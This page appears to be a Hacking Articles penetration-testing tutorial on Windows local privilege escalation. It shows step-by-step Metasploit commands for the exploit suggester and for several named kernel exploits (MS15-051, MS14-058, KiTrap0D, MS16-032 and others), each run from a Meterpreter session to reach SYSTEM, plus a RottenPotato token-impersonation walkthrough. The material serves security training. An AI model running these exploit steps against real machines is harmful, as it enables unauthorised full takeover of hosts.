<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Kernel Exploit Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2018-09-10T05:32:35+00:00">September 10, 2018</time><time class="updated" datetime="2025-06-08T13:32:03+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">Hello Friends!! In our previous <a style="color: #000000;" href="https://www.hackingarticles.in/window-privilege-escalation-automated-script/">article</a> we had discussed “<em>Vectors of Windows Privilege Escalation using the automated script</em>” and today we are demonstrating the Windows privilege escalation via <strong>Kernel exploitation methodologies</strong>. For this purpose, we will utilize an in-built Metasploit module known as Local Exploit Suggester. The objective of this suggested is to just identify what parts of a system can be exploitable and to give us an insight on the best matching possible exploits available, which can be further utilized to elevate the privileges.</span></p>
<h3 class="ai-optimize-7"><span style="color: #000000;"><span style="color: #800000;">Table of Content</span> </span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">Windows-Exploit-suggester</span></li>
<li class="ai-optimize-9"><span style="color: #000000;">Windows ClientCopyImage Win32k Exploit</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Windows TrackPopupMenu Win32k NULL Pointer Dereference</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Windows SYSTEM Escalation via KiTrap0D</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Windows Escalate Task Scheduler XML Privilege Escalation</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">MS16-016 mrxdav.sys WebDav Local Privilege Escalation</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">EPATHOBJ::pprFlattenRec Local Privilege Escalation</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">MS13-053: NTUserMessageCall Win32k Kernel Pool Overflow</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">MS16-032 Secondary Logon Handle Privilege Escalation</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">RottenPotato</span></li>
</ul>
<h3 class="ai-optimize-18"><span style="color: #800000;">Windows-Exploit-suggester</span></h3>
<p class="ai-optimize-19"><span style="color: #000000;">The Metasploit in-built module suggests various local exploits that can be used to perform Privilege escalation and provides a suggestion based on the architecture, platform (i.e the operating system it’s being run on), session type and required default options. It saves our time as we don’t have to manually search around for local exploits until none of the options provided works.</span></p>
<p class="ai-optimize-20"><span style="color: #000000;">It is also significant to note that, not ALL of these listed local exploits will be fired.</span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><strong>Usage </strong></span></p>
<p class="ai-optimize-22"><span style="color: #000000;"><strong>Note:</strong> For using the local exploit suggester, we must already have a Meterpreter session opened for our target machine. However, before running the Local Exploit suggester we need to put our existing active Meterpreter session to the background (CTRL + Z)</span></p>
<p class="ai-optimize-23"><span style="color: #000000;">Below is an example of the same, let’s say our existing active Meterpreter session is 1</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/recon/local_exploit_suggester
set LHOST 192.168.1.107
set SESSION 1
exploit</pre>
<p class="ai-optimize-24"><span style="color: #000000;">As you can observe it has suggested some post exploits against which the target is vulnerable and that can provide higher-privilege shell.</span></p>
<p class="ai-optimize-25"><span style="color: #000000;"><strong><img decoding="async" src="//4.bp.blogspot.com/-na8X7n-ydJE/W5X9dDvIgoI/AAAAAAAAaMc/IT2GTlae1xgJXD-7wuDlItWe5ji5enMPACEwYBhgL/s1600/0.png"/></strong></span></p>
<h3 class="ai-optimize-26"><span style="color: #800000;">Windows ClientCopyImage Win32k Exploit</span></h3>
<p class="ai-optimize-27"><span style="color: #000000;">Vulnerabilities in Windows Kernel-Mode Drivers could allow elevation of privilege. This module exploits improper object handling in the win32k.sys kernel mode driver.</span></p>
<p class="ai-optimize-28"><span style="color: #000000;">This module has been tested on vulnerable builds of Windows 7 x64 and x86, Windows 2008 R2 SP1 x64.</span></p>
<p class="ai-optimize-29"><span style="color: #000000;">Let’s navigate to MSF console and execute this exploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms15_051_client_copy_image
set lhost 192.168.1.107
set session 1
exploit</pre>
<p class="ai-optimize-30"><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-31"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-32"><span style="color: #000000;"><strong> <img decoding="async" src="//4.bp.blogspot.com/-hz_b--b-J58/W5X9dN3MTDI/AAAAAAAAaNQ/zlcnw5C4xBcI5knhNQbzI33PbF4dJ-WgACEwYBhgL/s1600/1.png"/></strong></span></p>
<h3 class="ai-optimize-33"><span style="color: #800000;">Windows TrackPopupMenu Win32k NULL Pointer Dereference</span></h3>
<p class="ai-optimize-34"><span style="color: #000000;">This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability can be triggered through the use of TrackPopupMenu. Under special conditions, the NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary code execution.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;">This module has been tested on Windows XP SP3, Windows Server 2003 SP2, Windows 7 SP1 Windows Server 2008 32bits and Windows Server 2008 R2 SP1 64 bits.</span></p>
<p class="ai-optimize-36"><span style="color: #000000;">Firstly, let’s navigate to MSF console and execute this exploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms14_058_track_popup_menu
set lhost 192.168.1.107
set session 1
exploit</pre>
<p class="ai-optimize-37"><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-38"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><strong> <img decoding="async" src="//3.bp.blogspot.com/-PkWBUa6gBt0/W5X9eP4yJlI/AAAAAAAAaNg/3ObWMMVKhrsv5kCj1cN58zmdNWdB175YgCEwYBhgL/s1600/2.png"/></strong></span></p>
<h3 class="ai-optimize-40"><span style="color: #800000;">Windows SYSTEM Escalation via KiTrap0D</span></h3>
<p class="ai-optimize-41"><span style="color: #000000;">This module will create a new session with SYSTEM privileges via the KiTrap0D exploit If the session in use is already elevated then the exploit will not run. The module relies on kitrap0d.x86.dll, and is not supported on x64 editions of Windows.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;">This module has been tested on vulnerable builds of Windows Server 2003, Windows Server 2008, Windows 7, XP for 32-bit Systems.</span></p>
<p class="ai-optimize-43"><span style="color: #000000;">Firstly, let’s navigate to MSF console and execute this exploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms10_015_kitrap0d
set lhost 192.168.1.107
set session 1
exploit</pre>
<p class="ai-optimize-44"><span style="color: #000000;"><strong> </strong>Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-45"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-WwQmpHxalZg/W5X9eeDovpI/AAAAAAAAaNc/qjBIxBGwPTAfhcB13aUc8ul2rErH9NmgwCEwYBhgL/s1600/3.png"/></span></p>
<h3 class="ai-optimize-47"><span style="color: #800000;">Windows Escalate Task Scheduler XML Privilege Escalation</span></h3>
<p class="ai-optimize-48"><span style="color: #000000;">This Vulnerability in Task Scheduler could allow elevation of privileges</span></p>
<p class="ai-optimize-49"><span style="color: #000000;">This security updates resolves a publicly disclosed vulnerability in Windows Task Scheduler. The vulnerability could allow elevation of privilege if an attacker logged on to an affected system and ran a specially crafted application. An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability. The vulnerability could not be exploited remotely or by anonymous users.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;">This module has been tested on vulnerable builds of Windows Vista, Windows 7, Windows Server 2008 x64 and x86</span></p>
<p class="ai-optimize-51"><span style="color: #000000;">Firstly, let’s navigate to MSF console and execute this exploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms10_092_schelevator
set lhost 192.168.1.107
set session 1
exploit</pre>
<p class="ai-optimize-52"><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-53"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><strong><img decoding="async" src="//1.bp.blogspot.com/-CnW1hzF17LU/W5X9eoyi9LI/AAAAAAAAaNo/a2bjptvbuGENwiM391vt_LMF_O54IiqIgCEwYBhgL/s1600/4.png"/> </strong></span></p>
<h3 class="ai-optimize-55"><span style="color: #800000;">MS16-016 mrxdav.sys WebDav Local Privilege Escalation</span></h3>
<p class="ai-optimize-56"><span style="color: #000000;">This module exploits the vulnerability in mrxdav.sys described by MS16-016. The module will spawn a process on the target system and elevate its privileges to NT AUTHORITY\SYSTEM before executing the specified payload within the context of the elevated process.</span></p>
<p class="ai-optimize-57"><span style="color: #000000;">This module has been tested on the vulnerable build of Windows 7 SP1, x86 architecture</span></p>
<p class="ai-optimize-58"><span style="color: #000000;">Firstly, let’s navigate to MSF console and execute this exploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms16_016_webdav
set lhost 192.168.1.107
set session 1
exploit</pre>
<p class="ai-optimize-59"><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-60"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-61"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-iw1y3u6GH1M/W5X9evbEaeI/AAAAAAAAaNg/3QcpMpIN05ovTwktiPuk6zVqyLOUsfHjQCEwYBhgL/s1600/5.png"/></span></p>
<h3 class="ai-optimize-62"><span style="color: #800000;">EPATHOBJ::pprFlattenRec Local Privilege Escalation</span></h3>
<p class="ai-optimize-63"><span style="color: #000000;">This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due to the usage of uninitialized data which allows to corrupt memory.</span></p>
<p class="ai-optimize-64"><span style="color: #000000;">At the moment, the module has been tested successfully on Windows XP SP3, Windows 2003 SP1, and Windows 7 SP1.</span></p>
<p class="ai-optimize-65"><span style="color: #000000;">Firstly, let’s navigate to MSF console and execute this exploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ppr_flatten_rec
set lhost 192.168.1.107
set session 1
exploit</pre>
<p class="ai-optimize-66"><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-67"><span style="color: #000000;">As we can see that we are logged into the system as a Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-68"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-50JEITNrWAg/W5X9e6spKLI/AAAAAAAAaNo/PJNJTAojY-gLRGgb_4uUWcvGM-xlfI-dACEwYBhgL/s1600/6.png"/></span></p>
<h3 class="ai-optimize-69"><span style="color: #800000;">MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow</span></h3>
<p class="ai-optimize-70"><span style="color: #000000;">A kernel pool overflow in Win32k which allows local privilege escalation. The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process). This allows any unprivileged process to freely migrate to winlogon.exe, achieving privilege escalation. Used in pwn2own 2013 by MWR to break out of chrome’s sandbox. NOTE: when you exit the meterpreter session, winlogon.exe is likely to crash.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;">At the moment, the module has been tested successfully on Windows 7 SP1 x86</span></p>
<p class="ai-optimize-72"><span style="color: #000000;">Firstly, let’s navigate to MSF console and execute this exploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms13_053_ schlamperei
set lhost 192.168.1.107
set session 1
exploit</pre>
<p class="ai-optimize-73"><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-74"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-XINCEa0_D58/W5X9fGJI9hI/AAAAAAAAaNk/45xBBBPUChAT9vj5mil5-6hn204WZmIMgCEwYBhgL/s1600/7.png"/></span></p>
<h3 class="ai-optimize-76"><span style="color: #800000;"><strong>MS16-032 Secondary Logon Handle Privilege Escalation</strong></span></h3>
<p class="ai-optimize-77"><span style="color: #000000;">This module exploits the lack of sanitization of standard handles in Windows’ Secondary Logon Service. The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This module will only work against those versions of Windows with Powershell 2.0 or later and systems with two or more CPU cores.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set session 1
exploit</pre>
<p class="ai-optimize-78"><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
getuid</pre>
<p class="ai-optimize-79"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-80"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-P1arpdUb6W0/W5X9fU2tK1I/AAAAAAAAaNo/IgS6EQNIgusnGBrRmrvNloR8dXCVECmJQCEwYBhgL/s1600/8.png"/></span></p>
<h3 class="ai-optimize-81"><span style="color: #800000;">RottenPotato</span></h3>
<p class="ai-optimize-82"><span style="color: #000000;">RottenPotato local privilege escalation from service account to SYSTEM.</span></p>
<p class="ai-optimize-83"><span style="color: #000000;">It is important to impersonate the token (or run list_tokens -u) quickly after running the binary. With the current implementation, the token seems to disappear shortly after the binary is run. It is also important to follow the order of the steps. Make sure you “use incognito” before running the binary.</span></p>
<p class="ai-optimize-84"><span style="color: #000000;">The incognito option in the meterpreter session was originally a stand-alone application that permitted you to impersonate user tokens when successfully compromising a system. And then we need to do first is identify if there are any valid tokens on this system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load incognito
list_tokens -u</pre>
<p class="ai-optimize-85"><span style="color: #000000;">If we talk related to impersonation token then you can see currently there is no token available.</span></p>
<p class="ai-optimize-86"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-jvqLb_hkAKY/WvHAyYuuwLI/AAAAAAAAWxc/To2KOzpvQuk2vV9BhIeVtf0yrmrWPmv-wCLcBGAs/s1600/23.png"/></span></p>
<p class="ai-optimize-87"><span style="color: #000000;">Then downloads <strong>Rottenpotato</strong> from GitHub for privilege escalation.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone //github.com/foxglovesec/RottenPotato.git
cd RottenPotato</pre>
<p class="ai-optimize-88"><span style="color: #000000;">After downloading it will give the <strong>rottenpotato.exe</strong> file.</span></p>
<p class="ai-optimize-89"><span style="color: #000000;">Upload the .exe file to the victim’s machine</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/Desktop/RottenPotato/rottenpotato.exe .</pre>
<p class="ai-optimize-90"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-DSMHJCIuauc/WvHAyk4CtmI/AAAAAAAAWxg/lx-2mzCBgG4cZ8veWoztGTe0PgRslm11wCLcBGAs/s1600/24.png"/></span></p>
<p class="ai-optimize-91"><span style="color: #000000;">Then, type the below command for executing exe file and then add SYSTEM token under impersonate user tokens.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">execute -Hc -f rottenpotato.exe
impersonate_token "NT AUTHORITY\\SYSTEM"</pre>
<p class="ai-optimize-92"><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-d0Fw4LlIplo/WvHAzKr2FhI/AAAAAAAAWxk/7u57iMzI5-chBzetF-j0h99qHC9bH7bgwCLcBGAs/s1600/25.png"/></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-94"><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing.<strong> Contact <a style="color: #000000;" href="//www.linkedin.com/in/sachdevankur/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
